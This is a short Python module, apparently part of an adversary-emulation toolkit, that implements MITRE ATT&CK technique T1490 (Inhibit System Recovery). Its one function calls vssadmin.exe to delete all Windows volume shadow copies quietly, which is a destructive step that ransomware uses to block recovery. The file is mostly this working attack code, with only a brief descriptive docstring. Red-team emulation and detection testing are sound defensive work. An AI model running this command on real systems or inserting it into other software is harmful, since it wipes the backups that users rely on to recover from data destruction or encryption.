"""Inhibit System Recovery

Adversaries may delete or remove built-in operating system data and turn off services 
designed to aid in the recovery of a corrupted system to prevent recovery. 
This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as 
a backup catalog, volume shadow copies, and automatic repair features. 
Adversaries may disable or delete system recovery features to augment 
the effects of Data Destruction and Data Encrypted for Impact.

Mitre: `T1490 <https://attack.mitre.org/techniques/T1490/>`_
"""

import logging
from subprocess import Popen

logger = logging.getLogger(__name__)


# https://learn.microsoft.com/de-de/windows-server/administration/windows-commands/vssadmin
def vssadmin_shadow() -> None:
    """Delete windows shadow copies.
    Requires admin privileges.
    """
    try:
        Popen(
            [r"C:\Windows\System32\vssadmin.exe", "delete", "shadows", "/all", "/quiet"]
        )
        logger.info("Deleting deleting windows shadow")
    except Exception as ex:
        logger.error("Something went wrong while deleting windows shadow copy: %s", ex)
